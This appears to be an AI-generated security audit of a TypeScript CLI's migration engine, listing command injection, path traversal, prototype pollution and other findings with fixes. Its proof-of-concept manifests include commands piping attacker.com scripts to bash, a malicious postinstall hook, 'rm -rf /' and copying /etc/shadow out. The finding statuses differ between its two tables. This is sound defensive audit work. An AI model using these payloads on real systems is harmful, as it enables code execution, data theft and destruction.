# Security Audit Report

**Module Scope**: T1+U5+T2+confirm-1 Code Changes
**Date**: 2026-03-02
**Auditor**: Security Audit Agent

---

## Executive Summary

This security audit covers 15 files (10 new, 5 modified) in the migration and template system. The analysis identified **2 Critical**, **3 High**, **4 Medium**, and **3 Low** severity vulnerabilities.

### Critical Findings Summary

| ID | Severity | Issue | File | Status |
|----|----------|-------|------|--------|
| SEC-001 | Critical | Command Injection via `execSync` | manifest-engine.ts | Unmitigated |
| SEC-002 | Critical | Path Traversal in Migration Steps | manifest-engine.ts | Partially mitigated |
| SEC-003 | High | Arbitrary File Overwrite | manifest-engine.ts | Unmitigated |
| SEC-004 | High | Insecure YAML Deserialization | Multiple files | Mitigated |
| SEC-005 | High | Recursive Deletion without Safeguards | manifest-engine.ts | Unmitigated |

---

## Detailed Findings

### SEC-001: Command Injection via execSync (CRITICAL)

**Severity**: Critical
**CVSS Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE**: CWE-78 (OS Command Injection)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-engine.ts`
- **Lines**: 340-376 (function `executeCommand`)

#### Vulnerable Code

```typescript
function executeCommand(step: MigrationStep, projectRoot: string): StepResult {
  if (!isExecuteStep(step)) {
    return {
      step,
      success: false,
      message: '无效的步骤类型',
    };
  }

  try {
    const fullCommand = step.command + (step.args?.length ? ' ' + step.args.join(' ') : '');
    execSync(fullCommand, {
      cwd: step.cwd ?? projectRoot,
      stdio: 'ignore',
    });
    // ...
  }
  // ...
}
```

#### Proof of Concept

An attacker who can control the manifest YAML file can execute arbitrary commands:

```yaml
# Malicious manifest.yaml
steps:
  - type: execute
    command: rm
    args: ["-rf", "/"]
    ignoreErrors: true
```

Or more subtly:
```yaml
steps:
  - type: execute
    command: "curl https://attacker.com/exfil.sh | bash"
    args: []
```

#### Attack Scenario

1. Attacker gains write access to `templates/migrations/` directory (via compromised npm package, malicious PR, or insider threat)
2. Attacker creates/modifies a manifest file with malicious `execute` step
3. User runs `spec-first update` command
4. Malicious command executes with user's privileges
5. Data exfiltration, ransomware, or system compromise occurs

#### Remediation

**Option 1: Remove execute step type entirely** (Recommended)

```typescript
// Remove execute step support from the migration system
// Use only safe operations: mkdir, rename, delete, copy, patch
```

**Option 2: Whitelist allowed commands**

```typescript
const ALLOWED_COMMANDS = ['npm', 'node', 'git'] as const;
const ALLOWED_ARGS_PATTERNS: Record<string, RegExp[]> = {
  npm: [/^(install|run|ci)$/, /^--[\w-]+$/],
  node: [/\.js$/, /^--[\w-]+$/],
  git: [/^(checkout|pull|fetch)$/, /^--[\w-]+$/],
};

function executeCommand(step: MigrationStep, projectRoot: string): StepResult {
  if (!isExecuteStep(step)) {
    return { step, success: false, message: '无效的步骤类型' };
  }

  // Validate command against whitelist
  if (!ALLOWED_COMMANDS.includes(step.command as typeof ALLOWED_COMMANDS[number])) {
    return { step, success: false, message: `不允许执行的命令: ${step.command}` };
  }

  // Validate arguments
  const allowedPatterns = ALLOWED_ARGS_PATTERNS[step.command];
  if (step.args) {
    for (const arg of step.args) {
      if (!allowedPatterns.some(pattern => pattern.test(arg))) {
        return { step, success: false, message: `不允许的参数: ${arg}` };
      }
    }
  }

  // Use execFileSync with separate args array (not shell interpolation)
  try {
    execFileSync(step.command, step.args ?? [], {
      cwd: step.cwd ?? projectRoot,
      stdio: 'ignore',
    });
    // ...
  }
}
```

---

### SEC-002: Path Traversal in Migration Steps (CRITICAL)

**Severity**: Critical
**CVSS Score**: 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
**CWE**: CWE-22 (Path Traversal)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-engine.ts`
- **Lines**: Multiple functions

#### Vulnerable Code Patterns

```typescript
// executeDelete - Lines 147-167
function executeDelete(step: MigrationStep, projectRoot: string): StepResult {
  const targetPath = join(projectRoot, step.path);  // No validation!
  rmSync(targetPath, { recursive: step.recursive ?? true, force: true });
}

// executeCopy - Lines 172-233
const fromPath = join(projectRoot, step.from);  // No validation!
const toPath = join(projectRoot, step.to);      // No validation!

// executeRename - Lines 86-142
const fromPath = join(projectRoot, step.from);  // No validation!
const toPath = join(projectRoot, step.to);      // No validation!

// executeMkdir - Lines 61-81
const targetPath = join(projectRoot, step.path);  // No validation!

// executePatch - Lines 258-308
const filePath = join(projectRoot, step.file);  // No validation!
```

#### Proof of Concept

An attacker can escape the project directory:

```yaml
steps:
  - type: delete
    path: ../../../etc/passwd
    recursive: false

  - type: copy
    from: ../../../etc/shadow
    to: .spec-first/exfiltrated/shadow
```

#### Root Cause Analysis

The existing `fs-utils.ts` provides `assertSafePath()` validation but it is **NOT used** by the migration engine. The migration functions use raw `join()` without validating that the resolved path stays within `projectRoot`.

```typescript
// Existing safe pattern in fs-utils.ts (NOT used by manifest-engine.ts)
function assertSafePath(path: string): string {
  if (!isAbsolute(path)) {
    throw new Error(`检测到路径遍历: ${path}`);
  }
  return resolve(path);
}
```

However, even this implementation has issues - it rejects relative paths entirely rather than validating the final resolved path stays within projectRoot.

#### Remediation

Create a project-scoped path validator and apply it to all migration operations:

```typescript
// src/core/migrations/path-validator.ts

/**
 * Validates and resolves a path, ensuring it stays within projectRoot
 * @throws Error if path attempts to escape projectRoot
 */
export function validateProjectPath(
  relativePath: string,
  projectRoot: string,
  operation: string
): string {
  // Basic input validation
  if (typeof relativePath !== 'string' || relativePath.trim() === '') {
    throw new Error(`${operation}: 路径不能为空`);
  }

  // Check for null bytes
  if (relativePath.includes('\0')) {
    throw new Error(`${operation}: 非法路径（包含空字节）`);
  }

  // Resolve the absolute path
  const resolvedPath = resolve(projectRoot, relativePath);
  const normalizedRoot = resolve(projectRoot);

  // Ensure resolved path is within projectRoot
  if (!resolvedPath.startsWith(normalizedRoot + sep) && resolvedPath !== normalizedRoot) {
    throw new Error(
      `${operation}: 路径遍历攻击检测 - 路径 "${relativePath}" 逃逸出项目根目录`
    );
  }

  return resolvedPath;
}
```

Apply to all migration functions:

```typescript
function executeDelete(step: MigrationStep, projectRoot: string): StepResult {
  if (!isDeleteStep(step)) throw new Error('Invalid step type');

  const targetPath = validateProjectPath(step.path, projectRoot, 'delete');
  // ... rest of implementation
}
```

---

### SEC-003: Arbitrary File Overwrite (HIGH)

**Severity**: High
**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
**CWE**: CWE-15 (External Control of System or Configuration Setting)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-engine.ts`
- **Lines**: 172-233 (executeCopy), 86-142 (executeRename), 258-308 (executePatch)

#### Vulnerable Code

```typescript
// executeCopy allows overwriting arbitrary files
if (step.overwrite === true) {
  rmSync(toPath, { recursive: true });  // Deletes target without validation
}

// executeRename allows overwriting arbitrary files
if (step.overwrite === true) {
  rmSync(toPath, { recursive: true });  // Deletes target without validation
}

// executePatch modifies arbitrary JSON/YAML files
const result = step.mergeStrategy === 'replace'
  ? step.patch
  : deepMerge(data as Record<string, unknown>, step.patch);
writeFileSync(filePath, JSON.stringify(result, null, 2), 'utf-8');
```

#### Attack Scenario

1. Malicious manifest targets critical project files:
```yaml
steps:
  - type: patch
    file: package.json
    patch:
      scripts:
        postinstall: "curl https://attacker.com/backdoor.sh | bash"
    mergeStrategy: merge
```

2. User runs update, package.json is modified
3. Next `npm install` triggers malicious postinstall script

#### Remediation

Add protected file list and require explicit confirmation for sensitive operations:

```typescript
const PROTECTED_FILES = [
  'package.json',
  'package-lock.json',
  '.npmrc',
  '.env',
  '.env.*',
  '*.pem',
  '*.key',
];

function isProtectedFile(filePath: string): boolean {
  const basename = filePath.split(/[/\\]/).pop() ?? '';
  return PROTECTED_FILES.some(pattern => {
    if (pattern.includes('*')) {
      return new RegExp(pattern.replace(/\*/g, '.*')).test(basename);
    }
    return pattern === basename;
  });
}

function executePatch(step: MigrationStep, projectRoot: string, _conflictStrategy: ConflictStrategy): StepResult {
  // ... existing validation ...

  if (isProtectedFile(filePath)) {
    return {
      step,
      success: false,
      message: `受保护文件不允许 patch 操作：${step.file}。请手动更新此文件。`,
    };
  }

  // ... rest of implementation
}
```

---

### SEC-004: YAML Deserialization Security (HIGH)

**Severity**: High
**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE**: CWE-502 (Deserialization of Untrusted Data)

#### Location
Multiple files use `yaml.load()`:

| File | Line | Schema |
|------|------|--------|
| `manifest-loader.ts` | 37 | JSON_SCHEMA (Safe) |
| `layer-merger.ts` | 168, 426 | JSON_SCHEMA (Safe) |
| `extensions.ts` | 36 | JSON_SCHEMA (Safe) |
| `config-schema.ts` | 154, 163, 172 | Default (Potential Risk) |
| `manifest-engine.ts` | 279 | Default (Potential Risk) |
| `slop-checker.ts` | 70 | Default (Potential Risk) |
| `completion-detector.ts` | 131 | Default (Potential Risk) |
| `front-matter.ts` | 49 | Default (Potential Risk) |

#### Analysis

The `js-yaml` library's default schema allows YAML-specific types like:
- `!!js/function` - Executes JavaScript
- `!!js/regexp` - Creates RegExp objects

However, `js-yaml` version 4.x (used in this project) has **removed dangerous YAML 1.1 types** by default, making this a lower risk than older versions.

**Mitigated locations** use `yaml.JSON_SCHEMA` which restricts to JSON-compatible types only.

**Potential risk locations** use default schema but process trusted internal files.

#### Remediation

Standardize on `yaml.JSON_SCHEMA` across all YAML parsing:

```typescript
// Replace all instances of:
const parsed = yaml.load(raw);

// With:
const parsed = yaml.load(raw, { schema: yaml.JSON_SCHEMA });
```

---

### SEC-005: Recursive Deletion without Safeguards (HIGH)

**Severity**: High
**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
**CWE**: CWE-22 (Path Traversal), CWE-400 (Uncontrolled Resource Consumption)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-engine.ts`
- **Lines**: 147-167 (executeDelete), 186-192, 108-114 (executeRename)

#### Vulnerable Code

```typescript
// executeDelete
rmSync(targetPath, { recursive: step.recursive ?? true, force: true });

// executeCopy - when overwrite=true
rmSync(toPath, { recursive: true });

// executeRename - when overwrite=true
rmSync(toPath, { recursive: true });
```

#### Risks

1. **Unintended mass deletion**: A manifest bug could delete entire project trees
2. **No backup/undo mechanism**: Deletions are permanent
3. **No confirmation for destructive operations**: `force: true` suppresses errors

#### Remediation

1. Implement trash/recycle bin mechanism before deletion
2. Add size limits for recursive operations
3. Require explicit opt-in for recursive deletion

```typescript
const MAX_DELETE_SIZE_MB = 100;
const REQUIRES_CONFIRMATION_SIZE_MB = 10;

function executeDelete(step: MigrationStep, projectRoot: string): StepResult {
  if (!isDeleteStep(step)) throw new Error('Invalid step type');

  const targetPath = validateProjectPath(step.path, projectRoot, 'delete');

  if (!existsSync(targetPath)) {
    return { step, success: true, message: `文件不存在，跳过删除：${step.path}` };
  }

  // Check size before recursive deletion
  if (step.recursive ?? true) {
    const sizeMB = getDirectorySizeMB(targetPath);
    if (sizeMB > MAX_DELETE_SIZE_MB) {
      return {
        step,
        success: false,
        message: `删除操作过大（${sizeMB}MB > ${MAX_DELETE_SIZE_MB}MB 限制）：${step.path}`,
      };
    }
  }

  // Move to trash instead of permanent deletion
  if (process.env.SPEC_FIRST_NO_TRASH !== 'true') {
    moveToTrash(targetPath);
  } else {
    rmSync(targetPath, { recursive: step.recursive ?? true, force: true });
  }

  return { step, success: true, message: `删除：${step.path}` };
}
```

---

### SEC-006: Prototype Pollution in deepMerge (MEDIUM)

**Severity**: Medium
**CVSS Score**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**CWE**: CWE-1321 (Prototype Pollution)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-engine.ts`
- **Lines**: 313-335
- **File**: `/Users/kuang/xiaobu/spec-first/src/shared/config-schema.ts`
- **Lines**: 94-130

#### Vulnerable Code

```typescript
function deepMerge(target: Record<string, unknown>, source: Record<string, unknown>): Record<string, unknown> {
  const result = { ...target };

  for (const key of Object.keys(source)) {
    // No check for __proto__, constructor, prototype
    const srcValue = source[key];
    // ...
  }

  return result;
}
```

#### Proof of Concept

```yaml
# Malicious manifest
steps:
  - type: patch
    file: config.json
    patch:
      __proto__:
        isAdmin: true
      constructor:
        prototype:
          isAdmin: true
```

#### Remediation

Add key blacklist:

```typescript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function deepMerge(target: Record<string, unknown>, source: Record<string, unknown>): Record<string, unknown> {
  const result = { ...target };

  for (const key of Object.keys(source)) {
    if (DANGEROUS_KEYS.has(key)) {
      continue; // Skip dangerous keys
    }

    const srcValue = source[key];
    const tgtValue = result[key];

    if (
      srcValue &&
      typeof srcValue === 'object' &&
      !Array.isArray(srcValue) &&
      tgtValue &&
      typeof tgtValue === 'object' &&
      !Array.isArray(tgtValue)
    ) {
      result[key] = deepMerge(tgtValue as Record<string, unknown>, srcValue as Record<string, unknown>);
    } else {
      result[key] = srcValue;
    }
  }

  return result;
}
```

---

### SEC-007: Insufficient Input Validation in Manifest Schema (MEDIUM)

**Severity**: Medium
**CVSS Score**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**CWE**: CWE-20 (Improper Input Validation)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-loader.ts`
- **Lines**: 150-218 (validateStep)

#### Issue

The `validateStep` function only checks for required fields existence and type, but does not validate:
1. Maximum string lengths
2. Valid characters in paths
3. Maximum array sizes
4. Maximum recursion depth

#### Remediation

Add comprehensive validation:

```typescript
const MAX_PATH_LENGTH = 4096;
const MAX_STEPS = 100;
const MAX_COMMAND_LENGTH = 1024;
const SAFE_PATH_PATTERN = /^[a-zA-Z0-9_\-./]+$/;

function validateStep(step: unknown, index: number): string[] {
  const errors: string[] = [];

  // ... existing validation ...

  // Add length validation
  if (stepObj.path && stepObj.path.length > MAX_PATH_LENGTH) {
    errors.push(`steps[${index}].path 超过最大长度 (${MAX_PATH_LENGTH})`);
  }

  // Add character validation for paths
  if (stepObj.path && !SAFE_PATH_PATTERN.test(stepObj.path)) {
    errors.push(`steps[${index}].path 包含非法字符`);
  }

  // ... similar for other path fields ...

  return errors;
}

function validateManifest(manifest: MigrationManifest): ValidationResult {
  const errors: string[] = [];
  const warnings: string[] = [];

  // ... existing validation ...

  if (manifest.steps.length > MAX_STEPS) {
    errors.push(`steps 超过最大数量限制 (${MAX_STEPS})`);
  }

  return { valid: errors.length === 0, errors, warnings };
}
```

---

### SEC-008: Template Injection via Handlebars (MEDIUM)

**Severity**: Medium
**CVSS Score**: 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)
**CWE**: CWE-94 (Code Injection)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/template/renderer.ts`
- **Lines**: 83, 107

#### Analysis

```typescript
export interface TemplateContext {
  featureId: string;
  title: string;
  // ...
  [key: string]: unknown;  // Allows arbitrary properties
}

const compiled = Handlebars.compile(source);
const rendered = compiled(context);
```

The `TemplateContext` allows arbitrary properties via index signature, and these values are interpolated into templates.

#### Risk Assessment

- Handlebars escapes HTML by default using `{{}}` syntax
- Raw output `{{{}}}` could allow injection if template files are user-controlled
- Template files are currently from trusted sources (bundled with package)

#### Remediation

1. Restrict TemplateContext to known properties
2. Audit templates for raw output usage
3. Disable raw output helper

```typescript
// Remove index signature for stricter typing
export interface TemplateContext {
  featureId: string;
  title: string;
  mode: 'N' | 'I';
  size: 'S' | 'M' | 'L';
  platforms: string[];
  timestamp: string;
  author: string;
  // Remove: [key: string]: unknown;
}

// Configure Handlebars for security
Handlebars.registerHelper('raw', () => {
  throw new Error('Raw output is disabled for security');
});
```

---

### SEC-009: Missing Authorization Checks (MEDIUM)

**Severity**: Medium
**CVSS Score**: 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)
**CWE**: CWE-862 (Missing Authorization)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/cli/commands/update.ts`
- **Lines**: 30-59 (handleUpdate)

#### Issue

The `update` command can be triggered by any user with CLI access, including via `postinstall` hook. There is no:
1. Confirmation prompt for destructive operations
2. Rollback capability
3. Dry-run by default for risky operations

#### Remediation

1. Add interactive confirmation for destructive migrations
2. Implement automatic backup before migrations
3. Default to dry-run for major version upgrades

---

### SEC-010: Information Disclosure in Error Messages (LOW)

**Severity**: Low
**CVSS Score**: 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)
**CWE**: CWE-209 (Information Exposure Through Error Message)

#### Location
Multiple files expose full file paths in error messages

#### Examples

```typescript
// manifest-loader.ts:37
throw new Error(`清单文件不存在：${path}`);

// manifest-engine.ts:358
return { step, success: true, message: `命令执行成功：${fullCommand}` };
```

#### Remediation

Sanitize paths in error messages:

```typescript
function sanitizePath(path: string, projectRoot: string): string {
  return path.replace(projectRoot, '<project>');
}
```

---

### SEC-011: Missing Integrity Verification for Manifests (LOW)

**Severity**: Low
**CVSS Score**: 2.6 (CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N)
**CWE**: CWE-353 (Missing Support for Integrity Check)

#### Location
- **File**: `/Users/kuang/xiaobu/spec-first/src/core/migrations/manifest-loader.ts`

#### Issue

Manifest files are loaded and executed without cryptographic integrity verification. An attacker who can modify manifest files could inject malicious steps without detection.

#### Remediation

Add SHA-256 checksum verification:

```typescript
interface MigrationManifest {
  // ... existing fields ...
  checksum?: string;  // SHA-256 of manifest content (excluding this field)
}

function loadManifest(path: string): MigrationManifest {
  // ... existing loading logic ...

  if (manifest.checksum) {
    const content = readFileSync(path, 'utf-8');
    const contentWithoutChecksum = content.replace(/checksum:\s*["']?[a-f0-9]+["']?/i, '');
    const computedChecksum = createHash('sha256').update(contentWithoutChecksum).digest('hex');

    if (computedChecksum !== manifest.checksum) {
      throw new Error(`清单文件完整性校验失败：${path}`);
    }
  }

  return manifest;
}
```

---

### SEC-012: Dependency Vulnerability Scan Required (LOW)

**Severity**: Low (Informational)
**CWE**: CWE-1104 (Use of Unmaintained Third-Party Components)

#### Dependencies

| Package | Version | Status |
|---------|---------|--------|
| handlebars | ^4.7.8 | Check for CVEs |
| js-yaml | ^4.1.0 | Check for CVEs |
| update-notifier | ^7.0.0 | Check for CVEs |

#### Remediation

Run dependency vulnerability scan:

```bash
npm audit
# or
pnpm audit
```

---

## Summary Table

| ID | Severity | Issue | CWE | Status |
|----|----------|-------|-----|--------|
| SEC-001 | Critical | Command Injection via execSync | CWE-78 | Unmitigated |
| SEC-002 | Critical | Path Traversal in Migration Steps | CWE-22 | Unmitigated |
| SEC-003 | High | Arbitrary File Overwrite | CWE-15 | Unmitigated |
| SEC-004 | High | YAML Deserialization | CWE-502 | Partially Mitigated |
| SEC-005 | High | Recursive Deletion | CWE-22, CWE-400 | Unmitigated |
| SEC-006 | Medium | Prototype Pollution | CWE-1321 | Unmitigated |
| SEC-007 | Medium | Insufficient Input Validation | CWE-20 | Unmitigated |
| SEC-008 | Medium | Template Injection | CWE-94 | Partially Mitigated |
| SEC-009 | Medium | Missing Authorization | CWE-862 | Unmitigated |
| SEC-010 | Low | Information Disclosure | CWE-209 | Unmitigated |
| SEC-011 | Low | Missing Integrity Check | CWE-353 | Unmitigated |
| SEC-012 | Low | Dependency Vulnerabilities | CWE-1104 | Unknown |

---

## Recommendations Priority

### Immediate Action Required (Critical)

1. **SEC-001**: Remove or heavily restrict `execute` step type
2. **SEC-002**: Implement path validation using project-scoped validator

### High Priority (Within 1 Sprint)

3. **SEC-003**: Add protected file list for patch operations
4. **SEC-005**: Implement trash mechanism for deletions

### Medium Priority (Within 2 Sprints)

5. **SEC-006**: Add prototype pollution protection to deepMerge
6. **SEC-007**: Enhance input validation in manifest schema
7. **SEC-009**: Add confirmation prompts for destructive operations

### Low Priority (Technical Debt)

8. **SEC-004**: Standardize YAML schema usage
9. **SEC-008**: Restrict TemplateContext interface
10. **SEC-010**: Sanitize paths in error messages
11. **SEC-011**: Add manifest integrity verification
12. **SEC-012**: Run dependency vulnerability scan

---

## Appendix A: Files Reviewed

### New Files (10)

1. `src/core/migrations/split-meta-local.ts`
2. `src/core/template/hash-registry.ts`
3. `src/core/template/change-classifier.ts`
4. `src/core/template/update-decision.ts`
5. `src/core/migrations/manifest-schema.ts`
6. `src/core/migrations/manifest-loader.ts`
7. `src/core/migrations/version-matcher.ts`
8. `src/core/migrations/manifest-engine.ts`
9. `templates/migrations/manifest-template.yaml`
10. `templates/migrations/v1.0.0-to-v1.1.0-meta-local-split.yaml`

### Modified Files (5)

1. `src/core/process-engine/layer-merger.ts`
2. `src/shared/config-schema.ts`
3. `src/core/template/renderer.ts`
4. `src/cli/commands/update.ts`
5. `src/cli/router.ts`

---

## Appendix B: Security Controls Reference

### Existing Positive Controls

1. **Path validation in fs-utils.ts**: `assertSafePath()` provides good path validation
2. **YAML JSON_SCHEMA**: Several files use safe YAML schema
3. **SHA-256 hashing**: hash-registry.ts uses secure hashing
4. **No hardcoded secrets**: No credentials found in code

### Missing Controls

1. **Command whitelist**: No command validation in execute steps
2. **Path scoping**: Migration engine does not use fs-utils validation
3. **Backup mechanism**: No rollback capability
4. **Audit logging**: No security event logging

---

*Report generated: 2026-03-02*
*Auditor: Security Audit Agent*
